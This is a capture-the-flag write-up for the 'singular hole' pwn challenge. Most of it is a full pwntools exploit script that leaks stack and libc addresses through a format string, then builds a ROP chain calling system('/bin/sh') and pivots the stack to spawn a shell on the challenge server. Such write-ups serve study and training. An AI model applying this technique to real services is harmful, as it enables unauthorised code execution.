# singular hole

```
surely one singular hole is easier to handle than many holes
nc challenge.secso.cc 9003 
```

Solved by @Rosayxy.

A very basic challenge. You leak the libc address and stack address using the format string, then you write rop chain to stack and use stack pivoting to hijack the control flow to our rop chain.

## exp

```python
from pwn import *
context(log_level = "debug", arch = "amd64", os = "linux")
# p = process("./chal")
p = remote("challenge.secso.cc", 9003)
libc = ELF("./libc.so.6")

p.recvuntil("Please state your name:\n")
p.sendline("%20$p %21$p")
p.recvuntil(">> ")
line = p.recvline().strip()
stack_leak = int(line.split(b" ")[2], 16)
libc_leak = int(line.split(b" ")[3], 16)
log.info("stack_leak: " + hex(stack_leak))
log.info("libc_leak: " + hex(libc_leak))
libc_base = libc_leak - 0x2a1ca
log.info("libc_base: " + hex(libc_base))
binsh = libc_base + next(libc.search(b"/bin/sh"))
system = libc_base + libc.symbols["system"]
pop_rdi = libc_base + 0x0010f75b
ret = pop_rdi + 1
puts_plt  = 0x0401080
p.recvuntil("Please state a fun fact about yourself:\n")
p.sendline(p64(pop_rdi) + p64(binsh) + p64(system))

# 0x7ffd9b35ee80 0x7ffd9b35ed60

p.recvuntil("Where would you like to place your hole?\n")
p.sendline(hex(stack_leak - 0x120))
fake_rbp_addr = stack_leak - 0x120 + 8
p.recvuntil("What would you like to write there?\n")
p.sendline(str(fake_rbp_addr%0x100))

p.interactive()
```

3rd solve: `Congratulations to team jiegec for the 3rd solve on challenge singular hole!`.
